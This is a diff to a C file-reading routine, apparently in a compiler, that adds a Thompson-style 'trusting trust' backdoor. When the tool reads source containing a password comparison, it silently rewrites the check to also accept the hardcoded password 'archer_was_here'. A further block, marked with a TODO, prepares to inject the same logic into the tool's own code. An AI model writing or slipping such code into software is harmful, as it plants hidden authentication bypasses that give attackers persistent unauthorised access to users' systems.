@@ -693,11 +693,19 @@ static char *read_file(char *path) {
   int num_lines = read_lines_to_array(fp, &lines);
   for (int i = 0; i < num_lines; i++) {
     char* line = lines[i];
+
+    char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
+    char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
+    if (strcmp(line, before) == 0) { // Replacement
+      printf("Replacement\n");
+      line = after;
+    }
     fwrite(line, 1, strlen(line), out);
-    if (i>=3 && strcmp(lines[i-3], "\tint num_lines = read_lines_to_array(fp, &lines);") == 0) { // If its the line above this
-    printf("Hello world\n");
-      char* d = ";printf(\"Hello world\n\");\n";
-      fwrite(d, 1, strlen(d), out);
+    if (i>=2 && strcmp(lines[i-2], "  int num_lines = read_lines_to_array(fp, &lines);\n") == 0) { // Injection
+      // TODO: Inject all of the above and this code too
+      printf("Injection: %s\n",  line);
+      // char* d = ";printf(\"Hello world\\n\");\n";
+      // fwrite(d, strlen(d), 1, out);
     }
   }
 
